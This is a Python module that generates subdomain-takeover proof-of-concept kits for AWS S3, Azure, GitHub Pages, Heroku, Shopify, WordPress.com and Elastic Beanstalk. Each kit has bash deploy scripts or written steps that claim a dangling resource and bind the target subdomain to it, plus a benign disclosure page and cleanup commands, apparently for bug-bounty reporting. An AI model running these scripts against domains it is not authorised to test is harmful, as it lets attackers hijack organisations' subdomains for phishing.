"""
PoC Generators for all vulnerable services
Generates commands, HTML, and CNAME files for subdomain takeover PoCs
"""

from datetime import datetime

def generate_poc_html(subdomain, service_name, service_details, researcher):
    """Generate professional PoC HTML"""
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{service_name} Subdomain Takeover - PoC</title>
    <style>
        body {{ font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }}
        .container {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        h1 {{ color: #d9534f; }}
        .info {{ background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0; }}
        .contact {{ background: #d4edda; padding: 15px; border-left: 4px solid #28a745; margin: 20px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 {service_name} Subdomain Takeover Detected</h1>
        <div class="info">
            <h2>Vulnerability Details</h2>
            <p><strong>Vulnerable Subdomain:</strong> {subdomain}</p>
            <p><strong>Service Type:</strong> {service_name}</p>
            {service_details}
            <p><strong>Discovered Date:</strong> {datetime.now().strftime('%Y-%m-%d')}</p>
        </div>
        <div class="contact">
            <h2>Security Researcher</h2>
            <p><strong>Researcher:</strong> {researcher}</p>
        </div>
        <h2>What is Subdomain Takeover?</h2>
        <p>This subdomain was pointing to an unclaimed/dangling resource. An attacker could claim this resource and host malicious content, enabling phishing attacks and brand impersonation.</p>
        <h2>Proof of Concept</h2>
        <p>This page demonstrates control over the subdomain. <strong>No malicious actions have been taken.</strong></p>
        <h2>Recommended Fix</h2>
        <ul>
            <li>Remove the DNS CNAME record</li>
            <li>If the resource is needed, reclaim it on the platform</li>
            <li>Implement DNS monitoring for dangling records</li>
        </ul>
        <p style="text-align: center; margin-top: 30px; color: #666;">
            <small>Responsible security disclosure for bug bounty purposes only.</small>
        </p>
    </div>
</body>
</html>"""

# Service-specific generators

def gen_s3(subdomain, bucket_name, region, researcher):
    """AWS S3 Bucket PoC Generator"""
    cname_content = subdomain

    service_details = f"""<p><strong>Bucket Name:</strong> {bucket_name}</p>
            <p><strong>Region:</strong> {region}</p>"""

    html = generate_poc_html(subdomain, "AWS S3 Bucket", service_details, researcher)

    commands = f"""#!/bin/bash
# AWS S3 Takeover PoC Commands

echo "Creating S3 bucket: {bucket_name}"

# 1. Create S3 bucket
aws s3 mb s3://{bucket_name} --region {region}

# 2. Create CNAME file (IMPORTANT: Links subdomain to bucket)
echo "{subdomain}" > CNAME

# 3. Create index.html with PoC content
cat > index.html << 'HTMLEOF'
{html}
HTMLEOF

# 4. Enable static website hosting
aws s3 website s3://{bucket_name} --index-document index.html

# 5. Create bucket policy for public read
cat > /tmp/bucket-policy.json << 'EOF'
{{
  "Version": "2012-10-17",
  "Statement": [{{
    "Sid": "PublicReadGetObject",
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::{bucket_name}/*"
  }}]
}}
EOF

# 6. Apply public read policy
aws s3api put-bucket-policy --bucket {bucket_name} --policy file:///tmp/bucket-policy.json

# 7. Upload CNAME and HTML files
aws s3 cp CNAME s3://{bucket_name}/CNAME
aws s3 cp index.html s3://{bucket_name}/index.html --content-type "text/html"

echo ""
echo "✅ PoC Deployed!"
echo "🌐 Bucket URL: http://{bucket_name}.s3-website-{region}.amazonaws.com"
echo "🔗 Should work on: http://{subdomain}"
echo ""
echo "Verify with:"
echo "  curl -v http://{subdomain}"
echo "  curl -v http://{bucket_name}.s3-website-{region}.amazonaws.com"
echo ""
echo "⚠️ CLEANUP after bug bounty confirmation:"
echo "  aws s3 rb s3://{bucket_name} --force"
"""

    return {
        'html': html,
        'commands': commands,
        'cname': cname_content,
        'files': [
            ('index.html', html),
            ('CNAME', cname_content),
            ('deploy.sh', commands)
        ]
    }

def gen_azure(subdomain, app_name, location, researcher):
    """Azure App Service PoC Generator"""
    cname_content = subdomain
    resource_group = f"bugbounty-poc-{app_name}"

    service_details = f"""<p><strong>App Name:</strong> {app_name}.azurewebsites.net</p>
            <p><strong>Location:</strong> {location}</p>"""

    html = generate_poc_html(subdomain, "Microsoft Azure App Service", service_details, researcher)

    commands = f"""#!/bin/bash
# Azure App Service Takeover PoC Commands

echo "Creating Azure App Service: {app_name}"

# 1. Login to Azure
az login

# 2. Create resource group
az group create --name {resource_group} --location {location}

# 3. Create app service plan (Free tier)
az appservice plan create --name poc-plan --resource-group {resource_group} --sku FREE --location {location}

# 4. Create web app
az webapp create --name {app_name} --resource-group {resource_group} --plan poc-plan

# 5. Add custom hostname (THIS LINKS SUBDOMAIN TO APP)
echo "Adding custom hostname: {subdomain}"
az webapp config hostname add --webapp-name {app_name} --resource-group {resource_group} --hostname {subdomain}

# 6. Create deployment package
echo "Creating deployment package..."
mkdir -p /tmp/azure-deploy-{app_name}
cd /tmp/azure-deploy-{app_name}

# Create CNAME file
echo "{subdomain}" > CNAME

# Create index.html
cat > index.html << 'HTMLEOF'
{html}
HTMLEOF

# Create web.config for proper routing
cat > web.config << 'WEBCONFIG'
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap fileExtension=".html" mimeType="text/html" />
        </staticContent>
        <defaultDocument>
            <files>
                <add value="index.html" />
            </files>
        </defaultDocument>
    </system.webServer>
</configuration>
WEBCONFIG

# Package everything
zip -r ../deploy.zip .

# 7. Deploy to Azure
echo "Deploying to Azure..."
cd ..
az webapp deployment source config-zip --resource-group {resource_group} --name {app_name} --src deploy.zip

echo ""
echo "✅ PoC Deployed!"
echo "🌐 App URL: https://{app_name}.azurewebsites.net"
echo "🔗 Should work on: https://{subdomain}"
echo ""
echo "Verify with:"
echo "  curl -v https://{subdomain}"
echo "  curl -v https://{app_name}.azurewebsites.net"
echo ""
echo "⚠️ CLEANUP after bug bounty confirmation:"
echo "  az group delete --name {resource_group} --yes"
"""

    return {
        'html': html,
        'commands': commands,
        'cname': cname_content,
        'files': [
            ('index.html', html),
            ('CNAME', cname_content),
            ('deploy.sh', commands)
        ]
    }

def gen_github(subdomain, github_cname, your_github, researcher):
    """GitHub Pages PoC Generator"""
    cname_content = subdomain

    service_details = f"""<p><strong>Original CNAME:</strong> {github_cname}.github.io</p>
            <p><strong>Your GitHub:</strong> {your_github}</p>"""

    html = generate_poc_html(subdomain, "GitHub Pages", service_details, researcher)

    commands = f"""#!/bin/bash
# GitHub Pages Takeover PoC Commands

echo "Setting up GitHub Pages takeover for {subdomain}"

# 1. Create repository locally
mkdir -p /tmp/github-pages-{github_cname}
cd /tmp/github-pages-{github_cname}

# 2. Create CNAME file (CRITICAL: This links your custom domain)
echo "{subdomain}" > CNAME

# 3. Create index.html
cat > index.html << 'HTMLEOF'
{html}
HTMLEOF

# 4. Initialize git and push
git init
git add .
git commit -m "Bug bounty PoC for {subdomain}"

echo ""
echo "📋 Next steps:"
echo ""
echo "Option 1: Create repo as {your_github}/{github_cname}.github.io"
echo "  1. Go to https://github.com/new"
echo "  2. Name: {github_cname}.github.io"
echo "  3. Make it public"
echo "  4. Run:"
echo "     git remote add origin https://github.com/{your_github}/{github_cname}.github.io.git"
echo "     git branch -M main"
echo "     git push -u origin main"
echo "  5. IMPORTANT: GitHub will automatically detect the CNAME file"
echo "  6. Verify at: https://{subdomain}"
echo ""
echo "Option 2: Try to register GitHub username '{github_cname}'"
echo "  If available, create account with that username"
echo "  Then create {github_cname}.github.io repository"
echo ""
echo "✅ Files ready in /tmp/github-pages-{github_cname}"
echo ""
echo "⚠️ CLEANUP after bug bounty confirmation:"
echo "  Delete the repository from GitHub"
"""

    return {
        'html': html,
        'commands': commands,
        'cname': cname_content,
        'files': [
            ('index.html', html),
            ('CNAME', cname_content),
            ('setup.sh', commands)
        ]
    }

def gen_heroku(subdomain, app_name, researcher):
    """Heroku PoC Generator"""
    cname_content = subdomain

    service_details = f"""<p><strong>App Name:</strong> {app_name}.herokuapp.com</p>"""

    html = generate_poc_html(subdomain, "Heroku", service_details, researcher)

    commands = f"""#!/bin/bash
# Heroku Takeover PoC Commands

echo "Creating Heroku app: {app_name}"

# 1. Login to Heroku
heroku login

# 2. Create Heroku app
heroku create {app_name}

# 3. Create app files
mkdir -p /tmp/heroku-poc-{app_name}
cd /tmp/heroku-poc-{app_name}

# CNAME file
echo "{subdomain}" > CNAME

# index.html
cat > index.html << 'HTMLEOF'
{html}
HTMLEOF

# Procfile for simple Python server
echo "web: python -m http.server \\$PORT" > Procfile

# requirements.txt (empty for now)
touch requirements.txt

# runtime.txt
echo "python-3.11.0" > runtime.txt

# 4. Initialize git and deploy
git init
git add .
git commit -m "PoC for {subdomain}"
heroku git:remote -a {app_name}

# 5. Deploy
git push heroku master

# 6. Add custom domain (THIS LINKS SUBDOMAIN)
heroku domains:add {subdomain} -a {app_name}

echo ""
echo "✅ PoC Deployed!"
echo "🌐 App URL: https://{app_name}.herokuapp.com"
echo "🔗 Should work on: https://{subdomain}"
echo ""
echo "⚠️ DNS Setup Required:"
echo "  The company's DNS must point to: {app_name}.herokuapp.com"
echo ""
echo "Verify with:"
echo "  curl -v https://{subdomain}"
echo ""
echo "⚠️ CLEANUP after bug bounty confirmation:"
echo "  heroku apps:destroy {app_name} --confirm {app_name}"
"""

    return {
        'html': html,
        'commands': commands,
        'cname': cname_content,
        'files': [
            ('index.html', html),
            ('CNAME', cname_content),
            ('deploy.sh', commands)
        ]
    }

def gen_shopify(subdomain, shop_name, researcher):
    """Shopify PoC Generator"""

    service_details = f"""<p><strong>Shop Name:</strong> {shop_name}.myshopify.com</p>"""

    html = generate_poc_html(subdomain, "Shopify", service_details, researcher)

    instructions = f"""# Shopify Takeover PoC Instructions

⚠️ Shopify requires manual setup through their dashboard

## Steps:

1. Go to https://www.shopify.com/
2. Sign up for a new shop with handle: {shop_name}
3. During setup, when asked for store name, use: {shop_name}
4. Your shop URL will be: https://{shop_name}.myshopify.com

5. Add custom domain:
   - Go to Settings → Domains
   - Click "Connect existing domain"
   - Enter: {subdomain}
   - Follow Shopify's verification process

6. Add PoC page:
   - Go to Online Store → Pages
   - Create new page titled "Security Research - PoC"
   - Paste the HTML content below
   - Set as homepage if possible

7. Verify:
   curl https://{subdomain}

## PoC HTML:
{html}

## CLEANUP after bug bounty confirmation:
- Remove custom domain from Shopify settings
- Delete or pause the shop
"""

    return {
        'html': html,
        'instructions': instructions,
        'files': [
            ('index.html', html),
            ('instructions.txt', instructions)
        ]
    }

def gen_wordpress(subdomain, blog_name, researcher):
    """WordPress.com PoC Generator"""

    service_details = f"""<p><strong>Blog Name:</strong> {blog_name}.wordpress.com</p>"""

    html = generate_poc_html(subdomain, "WordPress.com", service_details, researcher)

    instructions = f"""# WordPress.com Takeover PoC Instructions

⚠️ WordPress.com requires manual setup

## Steps:

1. Go to https://wordpress.com/start/
2. Create a new site with address: {blog_name}.wordpress.com
3. Choose free plan (sufficient for PoC)

4. Add custom domain:
   - Go to Upgrades → Domains
   - Add domain: {subdomain}
   - Note: May require paid plan for custom domain
   - Alternative: Just demonstrate control of {blog_name}.wordpress.com

5. Create PoC page:
   - Go to Pages → Add New
   - Title: "Subdomain Takeover - Security Research"
   - Switch to HTML/Code editor
   - Paste the HTML content below
   - Publish

6. Set as homepage:
   - Settings → Reading
   - Set "Your homepage displays" to the PoC page

7. Verify:
   curl https://{blog_name}.wordpress.com
   curl https://{subdomain}

## PoC HTML Content:
{html}

## CLEANUP after bug bounty confirmation:
- Remove custom domain
- Delete the site or make it private
"""

    return {
        'html': html,
        'instructions': instructions,
        'files': [
            ('poc_content.html', html),
            ('instructions.txt', instructions)
        ]
    }

def gen_elasticbeanstalk(subdomain, env_name, region, researcher):
    """AWS Elastic Beanstalk PoC Generator"""
    cname_content = subdomain

    service_details = f"""<p><strong>Environment:</strong> {env_name}.{region}.elasticbeanstalk.com</p>
            <p><strong>Region:</strong> {region}</p>"""

    html = generate_poc_html(subdomain, "AWS Elastic Beanstalk", service_details, researcher)

    commands = f"""#!/bin/bash
# AWS Elastic Beanstalk Takeover PoC

echo "Creating Elastic Beanstalk environment: {env_name}"

# 1. Create application
aws elasticbeanstalk create-application \\
    --application-name poc-app-{env_name} \\
    --region {region}

# 2. Create environment with specific CNAME
aws elasticbeanstalk create-environment \\
    --application-name poc-app-{env_name} \\
    --environment-name {env_name} \\
    --cname-prefix {env_name} \\
    --solution-stack-name "64bit Amazon Linux 2023 v4.0.0 running Python 3.11" \\
    --region {region}

# 3. Wait for environment to be ready
echo "Waiting for environment to be ready..."
aws elasticbeanstalk wait environment-exists \\
    --environment-names {env_name} \\
    --region {region}

# 4. Create application package
mkdir -p /tmp/eb-poc-{env_name}
cd /tmp/eb-poc-{env_name}

# CNAME file
echo "{subdomain}" > CNAME

# HTML
cat > index.html << 'HTMLEOF'
{html}
HTMLEOF

# application.py for Python
cat > application.py << 'PYEOF'
from flask import Flask, send_file
application = Flask(__name__)

@application.route('/')
def index():
    return send_file('index.html')

if __name__ == '__main__':
    application.run(host='0.0.0.0', port=8080)
PYEOF

# requirements.txt
echo "flask" > requirements.txt

# Package
zip -r ../app.zip .

# 5. Upload and deploy
aws elasticbeanstalk create-application-version \\
    --application-name poc-app-{env_name} \\
    --version-label v1 \\
    --source-bundle S3Bucket=elasticbeanstalk-{region}-$(aws sts get-caller-identity --query Account --output text),S3Key=app.zip \\
    --region {region}

aws elasticbeanstalk update-environment \\
    --environment-name {env_name} \\
    --version-label v1 \\
    --region {region}

echo ""
echo "✅ PoC Deployed!"
echo "🌐 App URL: http://{env_name}.{region}.elasticbeanstalk.com"
echo "🔗 Should work on: http://{subdomain}"
echo ""
echo "⚠️ CLEANUP after bug bounty confirmation:"
echo "  aws elasticbeanstalk terminate-environment --environment-name {env_name} --region {region}"
echo "  aws elasticbeanstalk delete-application --application-name poc-app-{env_name} --region {region}"
"""

    return {
        'html': html,
        'commands': commands,
        'cname': cname_content,
        'files': [
            ('index.html', html),
            ('CNAME', cname_content),
            ('deploy.sh', commands)
        ]
    }

# Map service names to generators
SERVICE_GENERATORS = {
    's3': gen_s3,
    'azure': gen_azure,
    'github': gen_github,
    'heroku': gen_heroku,
    'shopify': gen_shopify,
    'wordpress': gen_wordpress,
    'elasticbeanstalk': gen_elasticbeanstalk,
}
